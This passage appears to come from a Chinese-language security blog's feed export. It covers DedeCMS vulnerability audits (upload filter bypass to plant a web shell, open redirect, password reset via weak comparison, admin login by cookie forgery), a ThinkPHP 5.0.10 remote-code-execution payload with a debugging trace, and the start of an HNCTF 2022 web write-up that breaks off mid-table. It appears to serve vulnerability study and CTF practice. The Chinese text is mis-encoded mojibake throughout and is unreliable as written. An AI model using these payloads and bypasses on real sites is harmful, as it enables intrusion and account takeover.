¡éªŒï¼Œå¯ä»¥æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡ã€‚</p><p>ç»¼ä¸Šæ‰€å±ï¼Œæ˜¯ç®¡ç†å‘˜èº«ä»½ï¼Œåªéœ€è¦ä¿®æ”¹MIMEå’Œæ–‡ä»¶å¤´å³å¯ç»•è¿‡è¿‡æ»¤ã€‚</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>è·Ÿä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªæ ¡éªŒMIMEï¼Œä¸æ ¡éªŒåç¼€ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥åŠ æ°´å°çš„ï¼Œæ‰€ä»¥ä¼ ä¸€ä¸ªphpåç¼€çš„å›¾ç‰‡é©¬</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥å†™ğŸ</p><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>å‹æ ¹ä¸å­˜åœ¨ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯¹urlå…ˆè¿›è¡Œbase64åŠ å¯†ï¼Œå†è¿›è¡ŒurlåŠ å¯†å³å¯</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"><a href="#ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"></a>ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹</h2><p>å…ˆçœ‹ä¸€ä¸‹ä¼šå‘˜ä¸­å¿ƒçš„é€»è¾‘</p><p><code>member/index.php</code></p><p>æ ¡éªŒç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œç™»å½•åˆ™è¿›å…¥ä¼šå‘˜ä¸ªäººä¸­å¿ƒ</p><p><code>member/index_do.php</code></p><p>ä¼šå‘˜æ“ä½œä¸<code>$fmdo</code>å‚æ•°åŒ¹é…</p><p>é‡ç½®å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>é‡ç½®å¯†ç é€»è¾‘åœ¨<code>resetpassword.php</code>ä¸­,å¤§è‡´é€»è¾‘å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬ä¸€æ­¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¯†ç é—®é¢˜åˆ¤æ–­</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬äºŒæ­¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨å¯†ç é—®é¢˜åˆ¤æ–­</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>ä½¿ç”¨äº†å¼±æ¯”è¾ƒï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰è®¾ç½®å¯†ç é—®é¢˜ï¼Œé»˜è®¤å€¼å¦‚ä¸‹</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ <code>safequestion=0.0&amp;safeanswer=</code>æ¥è¿›å…¥è¯¥ifè¯­å¥</p><p>è·Ÿè¿› snï¼Œæœ€ç»ˆæ˜¯é‡å®šå‘åˆ°ä¿®æ”¹å¯†ç é¡µé¢</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="ä»»æ„ç”¨æˆ·ç™»å½•"><a href="#ä»»æ„ç”¨æˆ·ç™»å½•" class="headerlink" title="ä»»æ„ç”¨æˆ·ç™»å½•"></a>ä»»æ„ç”¨æˆ·ç™»å½•</h2><p>çœ‹ä¸€ä¸‹æ€ä¹ˆå¤„ç†çš„</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>è·Ÿè¿›</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>å¯¹å¾—åˆ°çš„<code>M_ID</code>åšäº†<code>intval</code>å¤„ç†ï¼Œæœ€åæ ¹æ®<code>M_ID</code>çš„å€¼ä»æ•°æ®åº“ä¸­å–å‡ºå¯¹åº”ç”¨æˆ·</p><p>è·Ÿè¿›<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>è·Ÿè¿›<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>ä¸¤ä¸ªIFï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­Cookieä¸­çš„DedeUserIDå’ŒDedeUserID__ckMD5,å¦‚æœéƒ½å­˜åœ¨è¿›å…¥ç¬¬äºŒä¸ªifï¼Œæ ¡éªŒcookieæœ‰æ•ˆæ€§ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡åŠ ç›å†åŠ å¯†çš„æ–¹å¼ï¼Œæ‰€ä»¥æŒ‰ç†è¯´æ˜¯æ— æ³•ä¼ªé€ cookieçš„ã€‚</p><p>ä½†æ˜¯å¯ä»¥ä»<code>/member/index.php</code>å¯ä»¥æ¥è·å–è¿™ä¸ªåŠ å¯†åçš„å€¼</p><p>æœç´¢<code>getcookie</code>å¾—åˆ°</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>è·Ÿè¸ª<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>å¦‚æœ<code>$last_vid</code>ä¸ºç©ºï¼Œé‚£ä¹ˆå°†<code>$uid</code>èµ‹å€¼ç»™<code>$last_vid</code>ï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™<code>PutCookie</code>å‡½æ•°</p><p>è·Ÿè¿›<code>PutCookie</code>å‡½æ•°</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>å¯ä»¥çœ‹åˆ°è·Ÿç™»å½•çš„<code>getcookie</code>åŠ å¯†æ–¹å¼ä¸€æ ·ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>ç™»å½•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·çš„èº«ä»½ç”±DedeUserIDçš„å€¼æ¥å†³å®š</span><br><span class="line"></span><br><span class="line">æ ¡éªŒï¼šDedeUserID__ckMd5çš„å€¼å’Œ<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è®©</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥ç»•è¿‡getcookieçš„æ ¡éªŒï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯<code>uid</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>userid</code>ï¼Œ<code>DedeUserID</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>mid</code>ï¼Œæ‰€ä»¥è¦è®©<code>uid</code>ä¸º<code>mid</code>æ‰å¯ä»¥ä¼ªé€ èº«ä»½</p><p><img src="/../images/image-20230526134001725-1686141975691.png" alt="image-20230526134001725"></p><p>è¿˜è®°å¾—ä¸Šé¢çš„å¤„ç†å—ï¼Ÿ</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªå«æœ‰æ•°å­—1çš„å­—ç¬¦ä¸²å°±å¯ä»¥ä¼ªé€ adminçš„èº«ä»½ã€‚</p><p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º1adminçš„ç”¨æˆ·</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>å°† <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ–°</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>å°†å…¶æ”¾ç½®åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œè®¿é—®<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h2><p>æ¨èé˜…è¯»<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="è·¯ç”±å’Œå‚æ•°ä¼ é€’"><a href="#è·¯ç”±å’Œå‚æ•°ä¼ é€’" class="headerlink" title="è·¯ç”±å’Œå‚æ•°ä¼ é€’"></a>è·¯ç”±å’Œå‚æ•°ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...] # pathinfoæ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # å…¼å®¹æ–¹å¼</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>å¦‚æ§åˆ¶å™¨Indexï¼š<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce"><a href="#Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce" class="headerlink" title="Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce"></a>Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Requestæ ¸å¿ƒç±»**$method** æ¥è‡ªå¯æ§çš„ <strong>$_POST</strong> æ•°ç»„ï¼Œè€Œä¸”åœ¨è·å–ä¹‹åæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥æŠŠå®ƒä½œä¸º <strong>Request</strong> ç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§æ•°æ® <strong>$_POST</strong> ã€‚å¯¼è‡´å¯ä»¥éšæ„è°ƒç”¨ <strong>Request</strong> ç±»çš„éƒ¨åˆ†æ–¹æ³•</p><blockquote><p><strong>è¿‡ç¨‹ï¼š</strong></p><p>è®©methodç­‰äº <code>__construct</code>é­”æœ¯æ–¹æ³•ï¼Œç„¶åé‡Œé¢çš„ <code>foreach</code>å‡½æ•°é€ æˆå˜é‡è¦†ç›–ã€‚ç„¶åé€šè¿‡<strong>Request</strong> ç±»ä¸­çš„ <code>param</code>æ–¹æ³•æœ€ç»ˆåˆè°ƒç”¨äº†<code>filterValue</code>æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</p></blockquote><blockquote><p><strong>Request</strong> ç±»ä¸­çš„ <code>paramã€routeã€getã€postã€putã€deleteã€patchã€requestã€sessionã€serverã€envã€cookieã€input</code> æ–¹æ³•å‡è°ƒç”¨äº† <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°</p></blockquote><p>ä»¥5.0.10ç‰ˆæœ¬ä¸ºä¾‹</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="è°ƒè¯•-1"><a href="#è°ƒè¯•-1" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>ç¬¬ä¸€ä¸ªæ–­ç‚¹ä¸‹åœ¨<code>thinkphp/libary/think/App.php</code>æ–‡ä»¶ï¼Œè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æè¿™é‡Œ</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>è·Ÿè¿›<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>è·Ÿè¿›<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>è·Ÿè¿›<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>åœ¨<code>application/config.php</code>ä¸­</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥æ§åˆ¶<code>method</code>å˜é‡ï¼Œä»è€Œä»»æ„è°ƒç”¨Requestç±»çš„æ–¹æ³•ã€‚</p><p>å¦‚æœè°ƒç”¨<code>__construct</code>æ–¹æ³•</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>å­˜åœ¨ä¸€ä¸ª<code>foreach</code>å¾ªç¯ï¼Œå¦‚æœä¼ å…¥çš„<code>options</code>æ•°ç»„çš„é”®åä¸ºè¯¥ç±»çš„å±æ€§ï¼Œå°±ç”¨é”®å€¼è¦†ç›–è¯¥å±æ€§çš„å€¼ã€‚</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>ç»§ç»­å¾€ä¸‹</p><p>åœ¨<code>App::run()</code>æ–¹æ³•é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯äº†debugæ¨¡å¼ï¼Œåˆ™ä¼šè°ƒç”¨<code>Request::param()</code>æ–¹æ³•ï¼š</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>å°±ç®—æ²¡æœ‰å¼€å¯debugæ¨¡å¼ï¼Œä¸‹é¢çš„execæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>è·Ÿè¿›<code>Request::param()</code>æ–¹æ³•</p><p>å°†è·å–åˆ°çš„postå‚æ•°ç”¨<code>array_merge</code>ä¸getæ–¹å¼çš„å‚æ•°è¿›è¡Œåˆå¹¶</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>æœ€åå°†å…¶ä¼ å…¥<code>input</code>ä¸­</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>è·Ÿè¿›<code>Request::input()</code>,<code>array_walk_recursive</code>  å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªæˆå‘˜é€’å½’åœ°åº”ç”¨ç”¨æˆ·å‡½æ•°</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>ç„¶å<code>filterValue</code>æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>call_user_func</code>é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="å…³é”®ç‚¹æ€»ç»“"><a href="#å…³é”®ç‚¹æ€»ç»“" class="headerlink" title="å…³é”®ç‚¹æ€»ç»“"></a>å…³é”®ç‚¹æ€»ç»“</h3><p>Fromï¼šä¸ƒæœˆç«å¸ˆå‚…çš„ä¸€å¼ æµç¨‹å›¾</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h3><p>æµç¨‹å¤§åŒå°å¼‚</p><p>payloadæ€»ç»“ï¼š<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—å¼±æ¯”è¾ƒ</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>çŒœæµ‹$passä¸ºå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—MD5ç›¸ç­‰</p><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡  <strong>0eå¼€å¤´çš„æ•°å­—å­—ç¬¦ä¸²</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_searché»˜è®¤å¼±æ¯”è¾ƒæŸ¥æ‰¾,è¿”å›æŸ¥æ‰¾æˆåŠŸå…ƒç´ çš„ä¸‹æ ‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// â€®â¦HNCTFâ©â¦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;â€®â¦+!!â©â¦&amp; <span class="string">&quot;â€®â¦ Flag!â©â¦ctf&quot;</span> == <span class="variable">$_GET</span>[â€®â¦LAGâ©â¦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5å¼±æ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>é›¶å®½åº¦éšå†™ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight php"><table><tr><td 